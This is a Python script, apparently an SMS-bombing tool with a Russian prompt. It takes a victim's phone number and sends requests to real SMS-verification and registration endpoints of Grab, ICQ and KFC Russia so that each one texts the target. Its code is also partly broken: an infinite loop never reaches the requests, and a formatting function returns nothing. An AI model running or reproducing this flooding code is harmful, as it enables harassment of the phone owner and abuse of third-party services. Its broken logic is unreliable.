import threading
import time
import requests, random, datetime, sys, time, argparse, os

print("""
╭╮╱╱╱╱╱╱╱╱╭━━╮╱╱╱╱╱╱╭╮╱╭━━━╮
┃┃╱╱╱╱╱╱╱╱┃╭╮┃╱╱╱╱╱╱┃┃╱┃╭━╮┃
┃┃╱╱╭━━┳╮╭┫╰╯╰┳━━┳╮╭┫╰━╋╯╭╯┣━╮
┃┃╱╭┫┃━┫╰╯┃╭━╮┃╭╮┃╰╯┃╭╮┣╮╰╮┃╭╯
┃╰━╯┃┃━┫┃┃┃╰━╯┃╰╯┃┃┃┃╰╯┃╰━╯┃┃
╰━━━┻━━┻┻┻┻━━━┻━━┻┻┻┻━━┻━━━┻╯""") 

phone = input("\033[32m Введите номер +")

def qw(_phone):
	if _phone[0] == '+':
		_phone = _phone[1:]
	if _phone[0] == '8':
		_phone = '7'+_phone[1:]
	if _phone[0] == '9':
		_phone = '7'+_phone
_phone = phone
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
s = 0
iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'

try:
	requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
except:
	s=s
try:
	requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
except:
	s=s
try:
	requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
except:
	s=s